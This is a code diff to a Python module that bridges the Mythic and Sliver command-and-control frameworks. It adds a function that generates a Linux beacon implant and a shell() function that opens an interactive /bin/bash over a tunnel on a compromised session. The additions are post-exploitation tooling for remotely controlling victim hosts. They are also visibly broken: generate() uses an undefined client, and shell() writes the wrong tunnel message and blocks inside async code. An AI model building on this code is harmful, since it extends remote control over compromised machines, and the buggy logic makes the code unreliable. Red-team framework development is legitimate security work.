@@ -1,8 +1,9 @@
 from mythic_container.MythicCommandBase import PTTaskMessageAllData
 from mythic_container.MythicRPC import SendMythicRPCFileGetContent, MythicRPCFileGetContentMessage
-from sliver import SliverClientConfig, SliverClient
+from sliver import SliverClientConfig, SliverClient, client_pb2, sliver_pb2
 import json
 import gzip
+import time
 
 async def create_sliver_client(taskData: PTTaskMessageAllData):
     # TODO: should this configfile somehow be cached so we aren't always using rpc to pull it?
@@ -23,6 +24,23 @@ async def create_sliver_client(taskData: PTTaskMessageAllData):
     await client.connect()
     
     return client
+
+async def generate():
+    # TODO: generate an implant based on config provided
+
+    implant_config = client_pb2.ImplantConfig(
+        IsBeacon=True,
+        Name="sliver-pytest-1",
+        GOARCH="amd64",
+        GOOS="linux",
+        Format=client_pb2.OutputFormat.EXECUTABLE,
+        ObfuscateSymbols=False,
+        C2=[client_pb2.ImplantC2(Priority=0, URL="http://localhost:80")],
+    )
+
+    implant = await client.generate_implant(implant_config)
+
+    return
 
 async def ifconfig(taskData: PTTaskMessageAllData):
     client = await create_sliver_client(taskData)
@@ -138,20 +156,6 @@ async def cd(taskData: PTTaskMessageAllData):
         
     return cd_results
 
-async def pwd(taskData: PTTaskMessageAllData):
-    client = await create_sliver_client(taskData)
-
-    callback_extra_info = json.loads(taskData.Callback.ExtraInfo)
-    if (callback_extra_info['type'] == 'beacon'):
-        interact = await client.interact_beacon(taskData.Payload.UUID)
-        pwd_task = await interact.pwd()
-        pwd_results = await pwd_task
-    else:
-        interact = await client.interact_session(taskData.Payload.UUID)
-        pwd_results = await interact.pwd()
-
-    return pwd_results
-
 async def execute(taskData: PTTaskMessageAllData):
     client = await create_sliver_client(taskData)
 
@@ -184,3 +188,95 @@ async def mkdir(taskData: PTTaskMessageAllData):
         mkdir_results = await interact.mkdir(remote_path=remote_path)
 
     return mkdir_results
+
+async def pwd(taskData: PTTaskMessageAllData):
+    client = await create_sliver_client(taskData)
+
+    callback_extra_info = json.loads(taskData.Callback.ExtraInfo)
+    if (callback_extra_info['type'] == 'beacon'):
+        interact = await client.interact_beacon(taskData.Payload.UUID)
+        pwd_task = await interact.pwd()
+        pwd_results = await pwd_task
+    else:
+        interact = await client.interact_session(taskData.Payload.UUID)
+        # pwd_results = await interact.pwd()
+
+        # Example of using the rpc calls more directly?
+        pwd = sliver_pb2.PwdReq()
+        pwd_results = await interact._stub.Pwd(interact._request(pwd))
+
+    return pwd_results
+
+async def shell(taskData: PTTaskMessageAllData):
+    client = await create_sliver_client(taskData)
+
+    callback_extra_info = json.loads(taskData.Callback.ExtraInfo)
+    if (callback_extra_info['type'] == 'beacon'):
+        # TODO: better error handling
+        return None
+
+    # this only applies to sessions, not beacons
+    interact = await client.interact_session(taskData.Payload.UUID)
+    
+    _rpc = interact._stub
+    request = interact._request
+    
+
+    tunnel = sliver_pb2.Tunnel(SessionID=interact.session_id)
+    rpcTunnel = await _rpc.CreateTunnel(tunnel)
+    # rpcTunnel = await client_pb2.CreateTunnel(tunnel)
+    # time.sleep(.5)
+
+    tunnelId = rpcTunnel.TunnelID
+
+    req = sliver_pb2.ShellReq()
+    req.TunnelID = tunnelId
+    req.Path = "/bin/bash"
+    req.EnablePTY = True
+    shell_result = await _rpc.Shell(request(req))
+    time.sleep(.5)
+
+    # def request_iterator():
+    #     data = sliver_pb2.TunnelData()
+    #     data.TunnelID = tunnelId
+    #     data.SessionID = interact.session_id
+    #     data.Data = b'id\n'
+    #     while True:
+    #         yield data
+
+    _tunnelStream = _rpc.TunnelData()
+
+    tunnelData = sliver_pb2.TunnelData()
+    tunnelData.TunnelID = tunnelId
+    tunnelData.SessionID = interact.session_id
+    await _tunnelStream.write(tunnelData) # bind?
+    time.sleep(.5)
+
+    testTunnelData = sliver_pb2.TunnelData()
+    testTunnelData.TunnelID = tunnelId
+    testTunnelData.SessionID = interact.session_id
+    testTunnelData.Data = b'id\n'
+    await _tunnelStream.write(tunnelData)
+
+    returnTunnelData = await _tunnelStream.read()
+
+
+    print(returnTunnelData)
+    
+
+    # async for data in client.on('data'):
+    #     print(data)
+
+    # def request_iterator():
+    #     while True:
+    #         user_input = input('stdin')
+    #         yield user_input
+            
+
+    # TODO: figure out how to loop through input / output with tunnel
+    # interact._stub.TunnelData(request_iterator=request_iterator)
+
+    # closeReq = client_pb2.CloseTunnelReq(TunnelID=tunnel.TunnelID)
+    # result = await interact._stub.CloseTunnel(interact._request(closeReq))
+
+    return shell_result, tunnel
